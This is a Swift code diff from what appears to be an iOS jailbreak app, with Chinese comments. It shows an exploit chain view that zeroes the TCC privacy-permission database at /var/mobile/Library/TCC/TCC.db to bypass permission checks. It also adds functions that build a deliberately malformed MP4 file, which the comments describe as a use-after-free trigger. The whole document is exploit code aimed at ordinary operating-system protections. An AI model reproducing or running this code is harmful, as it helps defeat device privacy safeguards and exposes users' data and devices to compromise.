@@ -386,15 +386,15 @@ struct ExploitChainView: View {
             let tccDbPath = "/var/mobile/Library/TCC/TCC.db"
             
             // 应用清零操作
-            let result = applySwiftFileZeroExploit(filePath: tccDbPath, zeroAllPages: false)
+            let result = CoreExploitLib.applySwiftFileZeroExploit(filePath: tccDbPath, zeroAllPages: false)
             
-            if result.success {
+            if result {
                 logStore.append(message: "TCC权限数据库已成功修改")
                 DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                     self.finalizeExploit(true)
                 }
             } else {
-                logStore.append(message: "TCC绕过失败: \(result.error)")
+                logStore.append(message: "TCC绕过失败")
                 self.finalizeExploit(false)
             }
         } catch {
@@ -772,4 +772,63 @@ func launchSileo(completion: @escaping (Bool) -> Void) {
     }
     
     completion(false)
+}
+
+// 准备畸形MP4文件以触发漏洞
+func prepareCorruptedMP4File(completion: @escaping (Bool, URL) -> Void) {
+    let tempDir = FileManager.default.temporaryDirectory
+    let fileURL = tempDir.appendingPathComponent("exploit-\(UUID().uuidString).mp4")
+    
+    do {
+        // 创建基础MP4文件
+        let malformedData = createMalformedMP4Data()
+        try malformedData.write(to: fileURL)
+        
+        // 验证文件是否创建成功
+        if FileManager.default.fileExists(atPath: fileURL.path) {
+            logStore?.append(message: "已创建畸形MP4文件: \(fileURL.lastPathComponent)")
+            completion(true, fileURL)
+        } else {
+            logStore?.append(message: "创建畸形MP4文件失败")
+            completion(false, fileURL)
+        }
+    } catch {
+        logStore?.append(message: "创建畸形MP4文件出错: \(error.localizedDescription)")
+        completion(false, fileURL)
+    }
+}
+
+// 创建畸形MP4数据
+private func createMalformedMP4Data() -> Data {
+    // 基本MP4文件头
+    var data = Data([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x6D, 0x70, 0x34, 0x32])
+    
+    // 添加畸形的moov原子，触发内存分配问题
+    let moovHeader: [UInt8] = [0x00, 0x00, 0x0F, 0xFF, 0x6D, 0x6F, 0x6F, 0x76]
+    data.append(contentsOf: moovHeader)
+    
+    // 添加畸形的trak原子，包含错误的大小指示器
+    let trakHeader: [UInt8] = [0xFF, 0xFF, 0xFF, 0xFF, 0x74, 0x72, 0x61, 0x6B]
+    data.append(contentsOf: trakHeader)
+    
+    // 添加畸形的mdia原子
+    let mdiaHeader: [UInt8] = [0x00, 0x00, 0x00, 0x20, 0x6D, 0x64, 0x69, 0x61]
+    data.append(contentsOf: mdiaHeader)
+    
+    // 特制的UAF触发数据，指向可能已释放的内存区域
+    for _ in 0..<1024 {
+        data.append(contentsOf: [0x41, 0x41, 0x41, 0x41])
+    }
+    
+    return data
+}
+
+extension Int32 {
+    var success: Bool {
+        return self == 0
+    }
+    
+    var error: String {
+        return String(describing: self)
+    }
 }
